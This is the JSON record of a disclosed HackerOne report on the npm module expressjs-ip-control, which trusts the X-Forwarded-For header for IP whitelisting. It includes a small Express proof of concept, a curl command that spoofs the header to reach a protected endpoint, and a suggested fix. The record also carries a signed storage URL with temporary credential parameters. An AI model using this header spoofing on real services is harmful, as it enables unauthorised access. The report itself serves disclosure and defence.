@@ -1,0 +1,188 @@
+{
+  "id": 693788,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82OTM3ODg=",
+  "url": "https://hackerone.com/reports/693788",
+  "title": "[expressjs-ip-control] Whitelist IP bypass leads to authorization bypass and sensitive info disclosure",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2019-09-12T15:55:04.541Z",
+  "submitted_at": "2019-09-12T15:55:04.541Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "mik317",
+    "url": "/mik317",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/235/168/b1978368a15e57488f15b4f8aff454d3e3e98184_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-10-29T19:27:29.116Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2020-09-29T19:27:20.544Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report a `unauthenticated access/authorization bypass` issue in the `expressjs-ip-control` module.\nIt allows to `bypass` the `whitelist IP check` in order to bypass the `authorization check` and possibly `expose sensitive datas`.\n\n# Module\n**module name:** [MODULE NAME]\n**version:** [MODULE VERSION]\n**npm page:** `https://www.npmjs.com/package/[MODULE NAME]`\n\n## Module Description\n> Expressjs package to whitelist IP addresses also support for x-forwarded-for ip addresses.\n\n## Module Stats\n[`N/A`] downloads in the last day\n[`17`] downloads in the last week\n[`~250`] downloads in the last month\n\n## Vulnerability Description\nThe issue arises because the module checks if is present in the request a `X-Forwarded-For` header, and bases the authorization on that check ... as we know, that header can be simply manipulated, in order to `bypass` the protection, leading to `sensitive information disclosure`.\n\n## Steps To Reproduce:\n1. Install the module: `npm i expressjs-ip-control`\n2. Create a PoC file like this:\n\n```js\n// poc.js\nconst express = require('express')\nconst app = express()\nconst ipControl = require('expressjs-ip-control')\n \napp.get('/', ipControl({\n    whitelist: '127.0.0.1, 192.168.10.10',\n}), (req, res) => res.send('SECRET TOKEN ACCESSIBLE ONLY BY LOCAL PC'))\n\napp.listen(3000)\n```\n3. Run the PoC: `node poc.js`\n4. Now, test the `whitelist` protection with this commands: \n\n```bash\ncurl 'http://localhost:3000/' # Obtain *403* response --> *You do not have rights to visit this page*\ncurl 'http://localhost:3000/' -H 'X-Forwarded-For: 127.0.0.1' # Obtain *200* response --> secret token\n```\n{F581254}\n\n## Patch\n> Don't check for the `x-forwarded-for` header, has it can be changed leading to `IP whitelist` bypass\n\n## Supporting Material/References:\n- [OPERATING SYSTEM VERSION]: Kali Linux\n- [NODEJS VERSION]: 10.16.3\n- [NPM VERSION]: 6.0.9\n\n# Wrap up\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\nI'm not sure you'll consider this issue valid, as the `x-forwarded-for` header support, is a feature of the library. However, this \"feature\" leads to the issue I've described. If you won't consider this valid, pls be clement and also, can I know if you consider valid the same issue applied to a `blacklist` module? (in that case, it could allow attackers blacklisted to change IP without change PC and so continue DOS/spam the server :))\n\n## Impact\n\n`Whitelist IP bypass`, leading to`Authorization issue` on `expressjs-ip-control`, may lead to `sensitive information disclosure`",
+  "weakness": {
+    "id": 18,
+    "name": "Information Disclosure"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 581254,
+      "file_name": "Screenshot_from_2019-09-12_15-36-06.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xvjoQSEDV8hKM5gkkt4AHTrw?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2019-09-12_15-36-06.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2019-09-12_15-36-06.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5CUWFK5L%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T045544Z&X-Amz-Expires=1102&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEK%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAVLQ1k%2FE9mni3x%2B8gApBqsnejRsdMWQn0fTw7TVqgNaAiEA93h29Npxt2rzfKrJ9RU4a%2BW7rRmK1yMDu2DfhMF5yVMqsQUIeBADGgwwMTM2MTkyNzQ4NDkiDCagDSrjynWtn06X6iqOBdmCnll5QGOIBe9kr8nGAvg1ay3vP1Wp4cHdI%2BHlmIUrCf%2BZUw8UJnQap2l6BszyMFiaOLxYwTm1coajgxWKcLFv3LLo0vw37zDLBb8OgXwl5eD2iyi2G1P2GjN9xPJs7WcsU0oTNUUnoeTz5G8EDjI8eQ1r3Hc9eorwVTG2aCaC0q46zS%2FdXMKJBeJZ1L7K7sOkcK%2B%2F7dElxs9FUYnuMhPBQpFmBaD589ZEMs5OQwjancnUv9iP26EMVqftydm4jnPyqDOB0ZWpXRjw9jKGjkEOfdzP6bqH0N%2FOl71ZjY3tFX7R2PZuqoHufilAhuzPTu2RGUTF%2F1PvwrZe5t8L%2Bt4CSL3dHn433342NGNasCYgyESmkZ2zAIQ%2B7NWpvjYCayq1WDtI%2FwtMkYBxulYCfVXv54GzH0%2Bl3Ha0364oKQLCFRaVuWTV9Nm%2F4nVE%2FZJOV5ZpUTPY107ARCYzbsjSGNfvN%2FEvufC1SHrvn7vj112wMGBI3uqTTJwW5ZYlLb4dw2YrqX4Vx0mthFIzaIii7mk3mWZ8H8i8dUhqGHqtiKU8Qpm7Lz6XGVyse3A7Bqkr35dXYFMlmTzQg7wW0E3zSeeTjF0g2ePt2V99je%2F374IxiGojp5uV6iEY0BTY0u54985GDBdIpkjgZvSx3G00SyToeOggkEfIRYEfpc1Y%2BQJ3blI8Sl6qy3TW6i%2B20JNM85ERw7vVsu3Cra1M9vLnc9U83lhr80J54zXI8hJvzQoSNDRAUdEQ1aYWxAcDqrTZ%2BgZRmQLpKbKJayxnna29OZtuiCiHE1IITh2u7mmM%2FTbc7NVf2SwvxTecJ5QsTldU7aPhvqZynVLGISnEIXrU7WLm3ce7L3YEQrCddbY9YTD7hLbSBjqxAWYW%2F2S%2Bej1V4MXN4A3tsT35c3RNNZb8QhfUKjjb7rGeCYXAtPq4sEnXqt4sJ6CwvS5vxu7OBltMmOyVi9SrzfeTRoRgzz7LS1q4GwWm85kt%2FJKkdwrij4knt4R9GMkENyUxhtNU0XsxVI9vm1ChfkQXOo6R4Oq%2BXXFQPRJqXpfS2GAg9ay1%2FLrJ2RYzktTS1Lr26eGLIcWhQmtIY6Ac3VjFDobJKA%2FJoAZfG1E4DbUnVA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=859c438af2a1ec0102ed5b1b2c83278eabf64455836ecc780b942b53eeab15a6",
+      "file_size": 95721,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-10-29T19:27:20.630Z",
+  "allow_singular_disclosure_after": -179486903.74216682,
+  "singular_disclosure_allowed": true,
+  "vote_count": 2,
+  "voters": [
+    "pr0f0x01",
+    "gr4nd_m4st3r"
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 2986,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "Other module",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "693788",
+  "votes": 2,
+  "latest_disclosable_activity_at": "2020-10-29T19:27:29.182Z",
+  "_metadata": {
+    "saved_at": "2026-07-08T12:55:44.508234",
+    "source": "https://hackerone.com/reports/693788.json",
+    "report_id": 693788
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82OTM3ODg=",
+    "databaseId": "693788",
+    "title": "[expressjs-ip-control] Whitelist IP bypass leads to authorization bypass and sensitive info disclosure",
+    "url": "https://hackerone.com/reports/693788",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2020-10-29T19:27:29.116Z",
+    "created_at": "2019-09-12T15:55:04.541Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzE4",
+      "name": "Information Disclosure",
+      "external_id": "cwe-200"
+    },
+    "severity": {
+      "rating": "medium",
+      "score": null
+    },
+    "reporter": {
+      "username": "mik317"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzIzOTQ5",
+      "handle": "nodejs-ecosystem",
+      "name": "Node.js third-party modules",
+      "url": "https://hackerone.com/nodejs-ecosystem",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": []
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzY5Mzc4OA==",
+    "_id": "693788",
+    "disclosed": true,
+    "votes": 2,
+    "latest_disclosable_activity_at": "2020-10-29T19:27:29.182Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82OTM3ODg=",
+      "databaseId": "693788",
+      "title": "[expressjs-ip-control] Whitelist IP bypass leads to authorization bypass and sensitive info disclosure",
+      "url": "https://hackerone.com/reports/693788",
+      "disclosed_at": "2020-10-29T19:27:29.116Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzIzOTQ5",
+      "handle": "nodejs-ecosystem",
+      "name": "Node.js third-party modules",
+      "url": "https://hackerone.com/nodejs-ecosystem",
+      "currency": "usd"
+    }
+  }
+}
